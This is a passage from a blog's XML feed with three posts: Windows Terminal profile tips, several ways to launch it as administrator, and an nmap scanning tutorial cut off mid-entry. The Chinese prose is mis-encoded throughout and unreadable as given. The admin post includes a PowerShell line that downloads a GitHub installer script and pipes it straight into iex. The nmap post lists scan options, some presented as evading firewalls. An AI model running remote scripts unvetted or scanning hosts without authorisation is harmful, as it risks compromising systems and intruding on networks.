      <title>windows terminalä½¿ç”¨</title>
      <link href="/2021/12/29/windows-terminal-shi-yong/"/>
      <url>/2021/12/29/windows-terminal-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="windows-terminalä½¿ç”¨"><a href="#windows-terminalä½¿ç”¨" class="headerlink" title="windows terminalä½¿ç”¨"></a>windows terminalä½¿ç”¨</h1><p>æœ¬æ–‡å°†ä»‹ç»ä¸€äº›windows terminalçš„åŸºæœ¬ä½¿ç”¨</p><p>é¦–å…ˆæ˜¯è¿™ä¸ªæ–°å»ºä¸€ä¸ªé…ç½®æ–‡ä»¶</p><p><img src="https://s4.ax1x.com/2021/12/30/T23kad.png" alt="T23kad.png"></p><p>å¯ä»¥å»ºä¸€ä¸ªç©ºçš„ï¼Œä¹Ÿå¯ä»¥å¤åˆ¶</p><p>æˆ‘ä»¬æ–°å»ºä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå¦‚å›¾</p><p><img src="https://s4.ax1x.com/2021/12/30/T23AIA.png" alt="T23AIA.png"></p><p>è¿™ä¸ªé…ç½®æ–‡ä»¶å°±åƒä¸€ä¸ªæŒ‰é’®ï¼Œå‘½ä»¤è¡Œå°±ç›¸å½“äºæŒ‰é’®çš„é“¾æ¥ï¼Œç‚¹å‡»å°±è¿è¡Œå‘½ä»¤</p><p>åç§°ï¼Œå‘½ä»¤è¡Œï¼Œå›¾æ ‡å¯ä»¥ç¨å¾®è®¾ç½®ä¸€ä¸‹ï¼Œå…¶ä»–çš„æ²¡å•¥å¯ä¿®æ”¹çš„</p><p>å›¾æ ‡å¯ä»¥ä½¿ç”¨ç½‘ç»œé“¾æ¥ï¼Œä¹Ÿå¯ä»¥æ˜¯æœ¬åœ°è·¯å¾„</p><p>è¿™é‡Œä¸»è¦è®²ä¸€ä¸‹å‘½ä»¤è¡Œ</p><h2 id="å‘½ä»¤è¡Œ"><a href="#å‘½ä»¤è¡Œ" class="headerlink" title="å‘½ä»¤è¡Œ"></a>å‘½ä»¤è¡Œ</h2><p>ä¸»è¦çš„å‡ ä¸ªä½¿ç”¨å°æŠ€å·§</p><ol><li><p>å¦‚æœä½ å®šä¹‰äº†ç¯å¢ƒå˜é‡ï¼Œç›´æ¥å†™ç¯å¢ƒå˜é‡ï¼Œå°±èƒ½ç›´æ¥è¿è¡Œï¼Œä¾‹å¦‚python</p><p><img src="https://s4.ax1x.com/2021/12/30/T23VPI.png" alt="T23VPI.png"></p><p><img src="https://s4.ax1x.com/2021/12/30/T23ZGt.png" alt="T23ZGt.png"></p></li><li><p>æ²¡æœ‰å®šä¹‰ç¯å¢ƒå˜é‡ï¼Œç›´æ¥ä½¿ç”¨ç»å¯¹è·¯å¾„</p><p><img src="https://s4.ax1x.com/2021/12/30/T23KsS.png" alt="T23KsS.png"></p><p><img src="https://s4.ax1x.com/2021/12/30/T23Mqg.png" alt="T23Mqg.png"></p></li><li><p>å¯ä»¥å½“ä½œå¿«é€Ÿå¯åŠ¨ç¨‹åºçš„ä¸€ä¸ªæ–¹å¼</p><p><img src="https://s4.ax1x.com/2021/12/30/T23uM8.png" alt="T23uM8.png"></p></li><li><p>ä»¥ç®¡ç†å‘˜æ–¹å¼å¯åŠ¨</p><p><img src="https://s4.ax1x.com/2021/12/30/T231aj.png" alt="T231aj.png"></p><p>wtä¸ºç¯å¢ƒå˜é‡æˆ–è€…ç»å¯¹è·¯å¾„</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows terminalè®¾ç½®ç®¡ç†å‘˜</title>
      <link href="/2021/12/29/windows-terminal-she-zhi-guan-li-yuan/"/>
      <url>/2021/12/29/windows-terminal-she-zhi-guan-li-yuan/</url>
      
        <content type="html"><![CDATA[<h1 id="windows-terminalè®¾ç½®ç®¡ç†å‘˜"><a href="#windows-terminalè®¾ç½®ç®¡ç†å‘˜" class="headerlink" title="windows terminalè®¾ç½®ç®¡ç†å‘˜"></a>windows terminalè®¾ç½®ç®¡ç†å‘˜</h1><p>ç°åœ¨windowsåŸºæœ¬ä¸Šéƒ½å†…ç½®äº†ï¼Œæ²¡æœ‰å°±å»ä¸‹è½½</p><h2 id="é€šç”¨æ–¹æ³•"><a href="#é€šç”¨æ–¹æ³•" class="headerlink" title="é€šç”¨æ–¹æ³•"></a>é€šç”¨æ–¹æ³•</h2><ol><li><p>æ·»åŠ ä¸€ä¸ªé…ç½®æ–‡ä»¶</p><p>è®¾ç½®-&gt;æ·»åŠ ä¸€ä¸ªæ–°çš„é…ç½®æ–‡ä»¶ï¼Œå†…å®¹å¦‚å›¾</p><p><img src="https://s4.ax1x.com/2021/12/30/T233Is.png" alt="T233Is.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">powershell.exe <span class="token parameter variable">-command</span> Start-Process <span class="token parameter variable">-Verb</span> RunAs <span class="token punctuation">\</span>"wt<span class="token punctuation">\</span>"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŸç†å°±æ˜¯é€šè¿‡åœ¨powershellä¸­ä»¥ç®¡ç†å‘˜æ–¹å¼å†æ¬¡æ‰“å¼€Windows PowerShellï¼Œä¸Šé¢çš„å‘½ä»¤è¡Œçš„ä½œç”¨å°±æ˜¯è¿™ä¸ªï¼Œæ‰€ä»¥ä¸èƒ½æŠŠè¿™ä¸ªé…ç½®æ–‡ä»¶è®¾ç½®ä¸ºé»˜è®¤ï¼Œä¸ç„¶ä¼šæ— é™é‡å¯ï¼Œæ‰‹è´±è¯•äº†çš„å°±é‡å¯ç”µè„‘ï¼Œä¸‹æ¬¡æ‰“å¼€wtï¼Œç‚¹å¦ï¼Œç„¶åæŠŠé…ç½®æ”¹å›æ¥ï¼Œæ‰€ä»¥è¿™ä¸ªæœ‰ç‚¹å°é¸¡è‚‹ï¼Œå…¶ä¸­å‘½ä»¤è¡Œ<strong>wt</strong>å¯ä»¥æ¢æˆåŠ è¿‡ç¯å¢ƒå˜é‡çš„å…¶ä»–ç¨‹åºï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥å†™ç»å¯¹è·¯å¾„</p></li><li><p>åˆ©ç”¨å…¶ä»–ç¨‹åºæ¥å®ç°</p><p>è¿™ä¸ªå®‰å…¨æ€§ä¸å¾—è€ŒçŸ¥ï¼Œå› ä¸ºè¿™ä¸ªç¨‹åºèƒ½è·å–ä½ çš„ç®¡ç†å‘˜æƒé™ï¼Œå½“ç„¶è‡ªå·±äººç”¨ç”¨è¿˜æ˜¯æ²¡å•¥é—®é¢˜ï¼Œå®ƒç±»ä¼¼linuxçš„sudo</p><p>å®‰è£…ï¼Œè¿è¡Œå‘½ä»¤</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PowerShell <span class="token parameter variable">-Command</span> <span class="token string">"Set-ExecutionPolicy RemoteSigned -scope Process; iwr -useb https://raw.githubusercontent.com/gerardog/gsudo/master/installgsudo.ps1 | iex"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¯¢é—®æ˜¯å¦ä½¿ç”¨åˆ«åï¼Œçœ‹è‡ªå·±çš„æ„å‘</p><p>ç„¶åæ·»åŠ å¦‚ä¸‹é…ç½®</p><p><img src="https://s4.ax1x.com/2021/12/30/T23Gin.png" alt="T23Gin.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gsudo.exe powershell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å’Œä¸Šé¢ä¸€æ ·æ„æ€</p></li><li><p>è¿è¡Œæ¡†å¯åŠ¨</p><p>win+xæ‰“å¼€è¿è¡Œçª—å£ï¼Œè¾“å…¥wtï¼ˆä½ æƒ³è¦è¿è¡Œçš„ç¨‹åºï¼‰ï¼Œç¡®è®¤åŒæ—¶æŒ‰ç€ctrl+shiftæ—¶ï¼Œç‚¹å‡»ç¡®å®šï¼Œä¾¿èƒ½ä»¥ç®¡ç†å‘˜æ–¹å¼è¿è¡Œ</p><p>è¿™ä¸ªå¯ä»¥è¯´æœ€ç®€å•</p></li><li><p>å†™æ‰¹å¤„ç†æ–‡ä»¶</p><p>å…ˆä¸€ä¸ªbatæ–‡ä»¶ï¼Œå‘½åéšæ„</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">powershell.exe Start-Process <span class="token parameter variable">-Verb</span> RunAs <span class="token punctuation">\</span>"wt<span class="token punctuation">\</span>"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨å†™ä¸€ä¸ªvbsæ–‡ä»¶ï¼Œå‘½åéšæ„</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Set ws <span class="token operator">=</span> CreateObject<span class="token punctuation">(</span><span class="token string">"Wscript.Shell"</span><span class="token punctuation">)</span>   ws.run <span class="token string">"cmd /c wta.bat"</span>,vbhide<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>wta.batæ˜¯æˆ‘çš„batæ–‡ä»¶åï¼Œæ”¾åœ¨åŒä¸€ä¸ªç›®å½•ï¼Œä½¿ç”¨æ—¶æ‰“å¼€vbsæ–‡ä»¶ï¼Œæˆ‘æ„Ÿè§‰è¿™æ ·æœ€å¥ˆæ–¯</p></li></ol><h2 id="win11"><a href="#win11" class="headerlink" title="win11"></a>win11</h2><p>å³å‡»å¼€å§‹-&gt;Windowsç»ˆç«¯ï¼ˆç®¡ç†å‘˜ï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nampä½¿ç”¨æ•™ç¨‹</title>
      <link href="/2021/12/25/nmap/"/>
      <url>/2021/12/25/nmap/</url>
      
        <content type="html"><![CDATA[<h1 id="nampä½¿ç”¨æ•™ç¨‹"><a href="#nampä½¿ç”¨æ•™ç¨‹" class="headerlink" title="nampä½¿ç”¨æ•™ç¨‹"></a>nampä½¿ç”¨æ•™ç¨‹</h1><p>nmapæ˜¯ä¸€ä¸ªç½‘ç»œè¿æ¥ç«¯æ‰«æè½¯ä»¶ï¼Œç”¨æ¥æ‰«æç½‘ä¸Šç”µè„‘å¼€æ”¾çš„ç½‘ç»œè¿æ¥ç«¯ã€‚ç¡®å®šå“ªäº›æœåŠ¡è¿è¡Œåœ¨å“ªäº›è¿æ¥ç«¯ï¼Œå¹¶ä¸”æ¨æ–­è®¡ç®—æœºè¿è¡Œå“ªä¸ªæ“ä½œç³»ç»Ÿã€‚å®ƒæ˜¯ç½‘ç»œç®¡ç†å‘˜å¿…ç”¨çš„è½¯ä»¶ä¹‹ä¸€ï¼Œä»¥åŠç”¨ä»¥è¯„ä¼°ç½‘ç»œç³»ç»Ÿå®‰å…¨ã€‚æˆ‘ä»¬ä¸€èˆ¬ç”¨å‘½ä»¤è¡Œå½¢å¼çš„è„šæœ¬ï¼Œä¸‹è½½ï¼š<a href="https://nmap.org/">Nmap: the Network Mapper - Free Security Scanner</a></p><h2 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h2><h3 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h3><p>ä¸»æœºå‘ç°æœ‰æ—¶å€™ä¹Ÿå«åšpingæ‰«æï¼Œä½†å®ƒè¿œè¿œè¶…è¶Šç”¨ä¸–äººçš†çŸ¥çš„pingå·¥å…· å‘é€ç®€å•çš„ICMPå›å£°è¯·æ±‚æŠ¥æ–‡ã€‚ç”¨æˆ·å®Œå…¨å¯ä»¥é€šè¿‡ä½¿ç”¨åˆ—è¡¨æ‰«æ(<code>-sL</code>)æˆ–è€… é€šè¿‡å…³é—­ping (<code>-P0</code>)è·³è¿‡pingçš„æ­¥éª¤ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¤šä¸ªç«¯å£æŠŠTCP SYN/ACKï¼ŒUDPå’ŒICMP ä»»æ„ç»„åˆèµ·æ¥ç©ä¸€ç©ã€‚è¿™äº›æ¢æµ‹çš„ç›®çš„æ˜¯è·å¾—å“åº”ä»¥æ˜¾ç¤ºæŸä¸ªIPåœ°å€æ˜¯å¦æ˜¯æ´»åŠ¨çš„(æ­£åœ¨è¢«æŸä¸»æœºæˆ–è€…ç½‘ç»œè®¾å¤‡ä½¿ç”¨)ã€‚ </p><h4 id="å¸¸è§„æ‰«æ"><a href="#å¸¸è§„æ‰«æ" class="headerlink" title="å¸¸è§„æ‰«æ"></a>å¸¸è§„æ‰«æ</h4><p>ç®€å•çš„åœ¨å‘½ä»¤ååŠ ipåœ°å€ï¼Œå¯ä»¥è¿›è¡Œå¸¸è§„æ‰«æï¼ŒæŸ¥çœ‹ä¸»æœºæ˜¯å¦å­˜æ´»ä»¥åŠå¼€æ”¾çš„ç«¯å£ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="åˆ—è¡¨æ‰«æ"><a href="#åˆ—è¡¨æ‰«æ" class="headerlink" title="åˆ—è¡¨æ‰«æ"></a>åˆ—è¡¨æ‰«æ</h4><p>åˆ—è¡¨æ‰«ææ˜¯ä¸»æœºå‘ç°çš„é€€åŒ–å½¢å¼ï¼Œå®ƒä»…ä»…åˆ—å‡ºæŒ‡å®šç½‘ç»œä¸Šçš„æ¯å°ä¸»æœºï¼Œ ä¸å‘é€ä»»ä½•æŠ¥æ–‡åˆ°ç›®æ ‡ä¸»æœºã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sL</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Ping-æ‰«æ"><a href="#Ping-æ‰«æ" class="headerlink" title="Ping æ‰«æ"></a>Ping æ‰«æ</h4><p>ç±»ä¼¼äºPingå‘½ä»¤ï¼Œä»…æ‰§è¡ŒPingæ‰«æï¼Œå¯ä»¥å¿«é€Ÿå‘ç°ä¸»æœºæ˜¯å¦å­˜æ´»ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sn</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="å…Pingæ‰«æ"><a href="#å…Pingæ‰«æ" class="headerlink" title="å…Pingæ‰«æ"></a>å…Pingæ‰«æ</h4><p>ç©¿é€é˜²ç«å¢™ï¼Œé¿å…è¢«é˜²ç«å¢™å‘ç°</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-P0</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="TCP-SYN-Ping-æ‰«æ"><a href="#TCP-SYN-Ping-æ‰«æ" class="headerlink" title="TCP SYN Ping æ‰«æ"></a>TCP SYN Ping æ‰«æ</h4><p>é€šå¸¸æƒ…å†µä¸‹ï¼ŒNmapé»˜è®¤Pingæ‰«ææ˜¯ä½¿ç”¨TCP ACKå’ŒICMP Echoè¯·æ±‚å¯¹ç›®æ ‡è¿›è¡Œæ˜¯å¦å­˜æ´»çš„å“åº”ï¼Œå½“ç›®æ ‡ä¸»æœºçš„é˜²ç«å¢™é˜»æ­¢è¿™äº›è¯·æ±‚æ—¶ï¼Œå¯ä»¥ä½¿ç”¨TCP Syn Pingæ‰«æã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PS</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="TCP-ACK-Ping-æ‰«æ"><a href="#TCP-ACK-Ping-æ‰«æ" class="headerlink" title="TCP ACK Ping æ‰«æ"></a>TCP ACK Ping æ‰«æ</h4><p>ä½¿ç”¨ <code>-PA</code> é€‰é¡¹å¯ä»¥è¿›è¡Œ TCP ACK Ping æ‰«æï¼Œå®ƒä¸ TCP Syn Ping æ˜¯éå¸¸ç±»ä¼¼çš„ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯è®¾ç½®TCPçš„æ ‡å¿—ä½æ˜¯ACKè€Œä¸æ˜¯SYNï¼Œä½¿ç”¨è¿™ç§æ–¹å¼æ‰«æå¯ä»¥æ¢æµ‹ç»„ç»‡SYNåŒ…æˆ–ICMP Echoè¯·æ±‚çš„ä¸»æœºã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PA</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="UDP-Ping-æ‰«æ"><a href="#UDP-Ping-æ‰«æ" class="headerlink" title="UDP Ping æ‰«æ"></a>UDP Ping æ‰«æ</h4><p><code>-PU</code> é€‰é¡¹æ˜¯å‘é€ä¸€ä¸ªç©ºçš„UDPæŠ¥æ–‡åˆ°æŒ‡å®šç«¯å£ï¼Œå¦‚æœç›®æ ‡ä¸»æœºå“åº”åˆ™è¿”å›ä¸€ä¸ªICMPç«¯å£ä¸å¯è¾¾é”™è¯¯ï¼Œå¦‚æœç›®æ ‡ä¸»æœºä¸æ˜¯å­˜æ´»çŠ¶æ€åˆ™ä¼šè¿”å›å„ç§ICMPæŠ¥é”™ä¿¡æ¯ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PU</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ICMP-Ping-Types-æ‰«æ"><a href="#ICMP-Ping-Types-æ‰«æ" class="headerlink" title="ICMP Ping Types æ‰«æ"></a>ICMP Ping Types æ‰«æ</h4><h5 id="ICMP-Echo-æ–¹å¼æ‰«æ"><a href="#ICMP-Echo-æ–¹å¼æ‰«æ" class="headerlink" title="ICMP Echo æ–¹å¼æ‰«æ"></a>ICMP Echo æ–¹å¼æ‰«æ</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PE</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="ä½¿ç”¨ICMPæ—¶é—´æˆ³Pingæ‰«æ"><a href="#ä½¿ç”¨ICMPæ—¶é—´æˆ³Pingæ‰«æ" class="headerlink" title="ä½¿ç”¨ICMPæ—¶é—´æˆ³Pingæ‰«æ"></a>ä½¿ç”¨ICMPæ—¶é—´æˆ³Pingæ‰«æ</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PP</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="ä½¿ç”¨ICMPåœ°å€æ©ç Pingæ‰«æ"><a href="#ä½¿ç”¨ICMPåœ°å€æ©ç Pingæ‰«æ" class="headerlink" title="ä½¿ç”¨ICMPåœ°å€æ©ç Pingæ‰«æ"></a>ä½¿ç”¨ICMPåœ°å€æ©ç Pingæ‰«æ</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PM</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ARP-Ping-æ‰«æ"><a href="#ARP-Ping-æ‰«æ" class="headerlink" title="ARP Ping æ‰«æ"></a>ARP Ping æ‰«æ</h4><p>è¿™ä¸ªé€‰é¡¹é€šå¸¸ç”¨åœ¨æ‰«æå±€åŸŸç½‘æ—¶ï¼Œåœ¨æœ¬åœ°å±€åŸŸç½‘ä¸­é˜²ç«å¢™ä¸ä¼šç¦æ­¢ARPè¯·æ±‚ï¼Œè¿™å°±ä½¿å®ƒçš„æ‰«ææ›´åŠ é«˜æ•ˆã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PR</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ç¦æ­¢æ–¹å‘åŸŸåè§£æ"><a href="#ç¦æ­¢æ–¹å‘åŸŸåè§£æ" class="headerlink" title="ç¦æ­¢æ–¹å‘åŸŸåè§£æ"></a>ç¦æ­¢æ–¹å‘åŸŸåè§£æ</h4><p>å‘Šè¯‰Nmapæ°¸ä¸å¯¹å®ƒå‘ç°çš„æ´»åŠ¨IPåœ°å€è¿›è¡Œåå‘åŸŸåè§£æ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-sL</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ–¹å‘åŸŸåè§£æ"><a href="#æ–¹å‘åŸŸåè§£æ" class="headerlink" title="æ–¹å‘åŸŸåè§£æ"></a>æ–¹å‘åŸŸåè§£æ</h4><p>å‘Šè¯‰Nmapæ°¸è¿œå¯¹ç›®æ ‡IPåœ°å€ä½œåå‘åŸŸåè§£æ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-R</span> <span class="token parameter variable">-sL</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ä½¿ç”¨ç³»ç»ŸåŸŸåè§£æç³»ç»Ÿ"><a href="#ä½¿ç”¨ç³»ç»ŸåŸŸåè§£æç³»ç»Ÿ" class="headerlink" title="ä½¿ç”¨ç³»ç»ŸåŸŸåè§£æç³»ç»Ÿ"></a>ä½¿ç”¨ç³»ç»ŸåŸŸåè§£æç³»ç»Ÿ</h4><p>Nmapé€šè¿‡ç›´æ¥å‘é€æŸ¥è¯¢åˆ°æ‚¨çš„ä¸»æœºä¸Šé…ç½®çš„åŸŸåæœåŠ¡å™¨æ¥è§£æåŸŸåã€‚ä¸ºäº†æé«˜æ€§èƒ½ï¼Œè®¸å¤šè¯·æ±‚ (ä¸€èˆ¬å‡ åä¸ª ) å¹¶å‘æ‰§è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --system-dns <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è·¯ç”±è·Ÿè¸ª"><a href="#è·¯ç”±è·Ÿè¸ª" class="headerlink" title="è·¯ç”±è·Ÿè¸ª"></a>è·¯ç”±è·Ÿè¸ª</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">--traceroute</span> <span class="token parameter variable">-v</span> åŸŸå<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="SCTP-INIT-Ping-æ‰«æ"><a href="#SCTP-INIT-Ping-æ‰«æ" class="headerlink" title="SCTP INIT Ping æ‰«æ"></a>SCTP INIT Ping æ‰«æ</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PY</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><p>æ‰«æç«¯å£å¼€æ”¾çŠ¶æ€ï¼Œç«¯å£åˆ†æˆå…­ä¸ªçŠ¶æ€: <code>open</code>(å¼€æ”¾çš„)ï¼Œ <code>closed</code>(å…³é—­çš„)ï¼Œ<code>filtered</code>(è¢«è¿‡æ»¤çš„)ï¼Œ <code>unfiltered</code>(æœªè¢«è¿‡æ»¤çš„)ï¼Œ <code>open|filtered(å¼€æ”¾æˆ–è€…è¢«è¿‡æ»¤çš„)</code>ï¼Œæˆ–è€… <code>closed|filtered(å…³é—­æˆ–è€…è¢«è¿‡æ»¤çš„)</code>ã€‚</p><h4 id="æ‰«ææŒ‡å®šç«¯å£"><a href="#æ‰«ææŒ‡å®šç«¯å£" class="headerlink" title="æ‰«ææŒ‡å®šç«¯å£"></a>æ‰«ææŒ‡å®šç«¯å£</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-p</span> port<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> <span class="token function">ip</span>nmap <span class="token parameter variable">-p</span> <span class="token number">80</span>-100 <span class="token function">ip</span>nmap <span class="token parameter variable">-p</span> T:80,U:445 <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="å¿«é€Ÿæ‰«æ"><a href="#å¿«é€Ÿæ‰«æ" class="headerlink" title="å¿«é€Ÿæ‰«æ"></a>å¿«é€Ÿæ‰«æ</h4><pre class="line-numbers language-none"><code class="language-none">nmap -F ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ä¸è¦æŒ‰éšæœºé¡ºåºæ‰«æç«¯å£"><a href="#ä¸è¦æŒ‰éšæœºé¡ºåºæ‰«æç«¯å£" class="headerlink" title="ä¸è¦æŒ‰éšæœºé¡ºåºæ‰«æç«¯å£"></a>ä¸è¦æŒ‰éšæœºé¡ºåºæ‰«æç«¯å£</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-r</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ—¶åºæ‰«æ"><a href="#æ—¶åºæ‰«æ" class="headerlink" title="æ—¶åºæ‰«æ"></a>æ—¶åºæ‰«æ</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -T<span class="token punctuation">(</span><span class="token number">0</span>-5<span class="token punctuation">)</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ‰«ææœ€æœ‰ç”¨çš„å‰100ä¸ªç«¯å£"><a href="#æ‰«ææœ€æœ‰ç”¨çš„å‰100ä¸ªç«¯å£" class="headerlink" title="æ‰«ææœ€æœ‰ç”¨çš„å‰100ä¸ªç«¯å£"></a>æ‰«ææœ€æœ‰ç”¨çš„å‰100ä¸ªç«¯å£</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --top-ports <span class="token number">100</span> <span class="token function">ip</span>   <span class="token punctuation">(</span>æ‰«ææœ€æœ‰ç”¨çš„å‰100ä¸ªç«¯å£<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="TCP-SYN-æ‰«æ-ï¼ˆé«˜æ•ˆçš„æ‰«ææ–¹å¼ï¼‰"><a href="#TCP-SYN-æ‰«æ-ï¼ˆé«˜æ•ˆçš„æ‰«ææ–¹å¼ï¼‰" class="headerlink" title="TCP SYN æ‰«æ ï¼ˆé«˜æ•ˆçš„æ‰«ææ–¹å¼ï¼‰"></a>TCP SYN æ‰«æ ï¼ˆé«˜æ•ˆçš„æ‰«ææ–¹å¼ï¼‰</h4><p>å®ƒå¸¸å¸¸è¢«ç§°ä¸ºåŠå¼€æ”¾æ‰«æï¼Œ å› ä¸ºå®ƒä¸æ‰“å¼€ä¸€ä¸ªå®Œå…¨çš„TCPè¿æ¥ã€‚å®ƒå‘é€ä¸€ä¸ªSYNæŠ¥æ–‡ï¼Œ å°±åƒæ‚¨çœŸçš„è¦æ‰“å¼€ä¸€ä¸ªè¿æ¥ï¼Œç„¶åç­‰å¾…å“åº”ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="TCP-è¿æ¥æ‰«æ"><a href="#TCP-è¿æ¥æ‰«æ" class="headerlink" title="TCP è¿æ¥æ‰«æ"></a>TCP è¿æ¥æ‰«æ</h4><p>å½“SYNæ‰«æä¸èƒ½ç”¨æ—¶ï¼ŒTCP Connect()æ‰«æå°±æ˜¯é»˜è®¤çš„TCPæ‰«æã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sT</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="UDP-è¿æ¥æ‰«æ"><a href="#UDP-è¿æ¥æ‰«æ" class="headerlink" title="UDP è¿æ¥æ‰«æ"></a>UDP è¿æ¥æ‰«æ</h4><p>UDPæ‰«æå‘é€ç©ºçš„(æ²¡æœ‰æ•°æ®)UDPæŠ¥å¤´åˆ°æ¯ä¸ªç›®æ ‡ç«¯å£ã€‚ å¦‚æœè¿”å›ICMPç«¯å£ä¸å¯åˆ°è¾¾é”™è¯¯ï¼Œ è¯¥ç«¯å£æ˜¯<code>closed</code>(å…³é—­çš„)ã€‚ å…¶å®ƒICMPä¸å¯åˆ°è¾¾é”™è¯¯è¡¨æ˜è¯¥ç«¯å£æ˜¯<code>filtered</code>(è¢«è¿‡æ»¤çš„)ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sU</span> <span class="token parameter variable">-p</span> <span class="token number">80</span>-100 <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 